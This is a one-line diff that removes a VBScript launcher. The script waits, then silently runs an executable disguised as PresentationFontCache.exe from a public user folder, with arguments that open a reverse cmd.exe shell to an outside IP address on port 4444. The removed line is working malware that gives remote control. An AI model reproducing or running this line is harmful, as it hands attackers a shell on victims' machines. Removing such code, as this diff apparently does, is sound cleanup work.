@@ -1,1 +1,0 @@
-WScript.Sleep(5000):Set DShell = WScript.CreateObject("WScript.Shell"):DShell.Run("C:\Users\Public\AccountPictures\PresentationFontCache.exe 109.234.36.141 4444 -e cmd.exe"), 0, True
